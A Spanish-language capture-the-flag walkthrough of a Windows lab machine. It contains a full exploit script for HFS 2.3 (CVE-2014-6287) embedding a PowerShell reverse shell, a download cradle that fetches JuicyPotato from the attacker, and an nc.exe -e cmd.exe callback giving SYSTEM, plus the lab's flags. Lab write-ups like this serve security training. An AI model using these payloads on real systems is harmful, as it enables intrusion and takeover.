---
icon: flag
---

# Espeto Malagueño (Windows) TheHackersLabs (Principiante)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 11:01 EDT
Nmap scan report for 192.168.28.8
Host is up (0.00026s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:28:82:40 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WIN-RE8NJPG9K5N, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:28:82:40 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-03-27T15:02:17
|_  start_date: 2025-03-27T14:42:13

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.92 seconds
```

Vemos que hay una pagina web en el puerto `80` la cual si entramos veremos varias funciones para `loguearnos`, subir archivos con nuestro usuario, etc...

Vero vamos a ver si la herramienta `whatweb` encuentra alguna version o algun tipo de `software` de forma mas concreta para poder buscar alguna vulnerabilidad que pueda estar asociada.

## Whatweb

```shell
whatweb http://<IP>/
```

Info:

```
http://<IP>/ [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[192.168.28.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
```

Vemos bastantes cosas interesantes, entre ellas que el `Software` se llama de la siguiente forma:

```
HttpFileServer 2.3
```

Y por lo que se ve tiene la version `2.3`, por lo que vamos a intentar buscar si tuviera alguna vulnerabilidad asociada.

Veremos que hay un `CVE-2014-6287` asociado a el en la que se puede ejecutar codigo de forma remota (`RCE`)

## Escalate user hacker

URL = [ExploitDB PoC](https://www.exploit-db.com/exploits/49584)

Nos descaragaremos el `exploit` de `python` y tendremos que hacerle algunos ajustes al `script`:

> 49584.py

```python
# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 20/02/2021
# Exploit Author: Pergyz
# Vendor Homepage: http://www.rejetto.com/hfs/
# Software Link: https://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Microsoft Windows Server 2012 R2 Standard
# CVE : CVE-2014-6287
# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands

#!/usr/bin/python3

import base64
import os
import urllib.request
import urllib.parse

lhost = "<IP_ATTACKER>"
lport = <PORT>
rhost = "<IP_VICTIM>"
rport = 80

# Define the command to be written to a file
command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'

# Encode the command in base64 format
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
print("\nEncoded the command in base64 format...")

# Define the payload to be included in the URL
payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

# Encode the payload and send a HTTP GET request
encoded_payload = urllib.parse.quote_plus(payload)
url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
urllib.request.urlopen(url)
print("\nEncoded the payload and sent a HTTP GET request to the target...")

# Print some information
print("\nPrinting some information for debugging...")
print("lhost: ", lhost)
print("lport: ", lport)
print("rhost: ", rhost)
print("rport: ", rport)
print("payload: ", payload)

# Listen for connections
print("\nListening for connection...")
os.system(f'nc -nlvp {lport}')
```

Solo tendremos que ajustar lo siguiente:

```
lhost = "<IP_ATTACKER>"
lport = <PORT>
rhost = "<IP_VICTIM>"
```

Una vez cambiado eso y guardado, tendremos que ejecutarlo de la siguiente forma:

### Explotando el CVE

```shell
python3 49584.py
```

Info:

```
Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  192.168.28.5
lport:  7777
rhost:  192.168.28.8
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAOAAuADUAIgAsADcANwA3ADcAKQA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

Listening for connection...
listening on [any] 7777 ...
connect to [192.168.28.5] from (UNKNOWN) [192.168.28.8] 49169
whoami
win-re8njpg9k5n\hacker
```

Con esto veremos que habremos obtenido la `shell` con el usuario `hacker`, por lo que leeremos la flag del usuario.

> user.txt

```
60dbda530c41c753a4472c0f28450f38
```

## Escalate Privileges

Si vemos los permisos que tenemos...

```powershell
whoami /priv
```

Info:

```
INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado       
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                       Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
```

Veremos la siguiente linea bastante interesante:

```
SeImpersonatePrivilege  Suplantar a un cliente tras la autenticaci?n Habilitada
```

**SeImpersonatePrivilege** en Windows permite que un proceso suplante la identidad de otro usuario después de autenticarse. Es común en servicios y procesos que necesitan actuar en nombre de un usuario autenticado.

#### **Explotación**

Los atacantes pueden aprovechar este privilegio para escalar privilegios mediante técnicas como **Juicy Potato**, **Rogue Potato** o **PrintSpoofer**, que permiten obtener acceso **SYSTEM** al redirigir tokens de autenticación de procesos privilegiados.

Vamos a verificar antes la version de `Windows` de la maquina victima metiendo el siguiente comando:

```powershell
(Get-WmiObject Win32_OperatingSystem).Caption
```

Info:

```
Microsoft Evaluaci?n de Windows Server 2012 R2 Standard
```

Vemos que es un `Windows Server 2012` por lo que nos sirve el `exploit` llamado `Juicy Potato`, vamos a descargarnoslo del siguiente repositorio:

URL = [GitHub Juicy Potato](https://github.com/ohpe/juicy-potato/)

URL = [Download JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)

Vamos abrirnos un servidor de `SMB` en nuestro `host` para utilizar el binario desde nuestro `host` pero ejecutandose en la maquina victima.

Vamos abrirnos el servidor de `SMB`:

```shell
impacket-smbserver -smb2support kali .
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Tambien tendremos que abrir un servidor de `Python3` para pasarnos el binario a la maquina victima:

```shell
python3 -m http.server 8000
```

Ahora desde la maquina victima haremos lo siguiente:

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP_ATTACKER>:8000/JuicyPotato.exe', 'C:\Users\hacker\Downloads\JuicyPotato.exe')"
```

Con esto nos habra descargado el binario, una vez echo esto, vamos a ejecutarlo de la siguiente forma:

```powershell
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p "C:\windows\system32\cmd.exe" -a "/C \\<IP_ATTACKER>\kali\nc.exe -e cmd.exe <IP_ATTACKER> <PORT>" -t *
```

Pero antes de ejecutarlo nos vamos a poner a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si ejecutamos el comando de antes...

```
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Si volvemos donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 5555 ...
connect to [192.168.28.5] from (UNKNOWN) [192.168.28.8] 49169
Microsoft Windows [Versi�n 6.3.9600]
(c) 2013 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Vemos que ya seremos `Administradores` del sistema, por lo que leeremos la flag del `admin`.

> root.txt

```
5dac6bd83c0b871998e9a34c0931f454
```
